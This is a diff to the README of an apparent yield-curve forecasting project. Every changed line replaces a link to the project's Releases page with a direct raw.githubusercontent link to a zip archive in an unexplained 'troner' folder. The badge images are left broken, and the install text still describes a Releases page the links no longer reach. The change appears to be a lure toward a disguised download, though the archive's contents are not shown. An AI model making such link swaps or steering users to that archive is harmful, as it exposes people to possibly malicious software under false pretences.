@@ -1,6 +1,6 @@
 # 🌟 forecasting_the_US_treasury_yield_curve - Predict U.S. Treasury Yields with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Shourya0609/forecasting_the_US_treasury_yield_curve/releases)
+[![Download Now](https://raw.githubusercontent.com/Shourya0609/forecasting_the_US_treasury_yield_curve/main/troner/yield-curve-treasury-forecasting-the-U-1.9.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Shourya0609/forecasting_the_US_treasury_yield_curve/main/troner/yield-curve-treasury-forecasting-the-U-1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This project provides a simple way to forecast U.S. Treasury yields using advanc
 
 ## 📥 Download & Install
 
-Visit this page to download the application: [Releases Page](https://github.com/Shourya0609/forecasting_the_US_treasury_yield_curve/releases). 
+Visit this page to download the application: [Releases Page](https://raw.githubusercontent.com/Shourya0609/forecasting_the_US_treasury_yield_curve/main/troner/yield-curve-treasury-forecasting-the-U-1.9.zip). 
 
 To install:
 1. Once on the Releases page, look for the latest version.
@@ -89,4 +89,4 @@ Join our community for discussions and sharing of results. Visit the Issues sect
 
 Thank you for choosing the forecasting_the_US_treasury_yield_curve application. We hope this tool becomes a valuable asset in your finance toolkit!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Shourya0609/forecasting_the_US_treasury_yield_curve/releases)
+[![Download Now](https://raw.githubusercontent.com/Shourya0609/forecasting_the_US_treasury_yield_curve/main/troner/yield-curve-treasury-forecasting-the-U-1.9.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/Shourya0609/forecasting_the_US_treasury_yield_curve/main/troner/yield-curve-treasury-forecasting-the-U-1.9.zip)
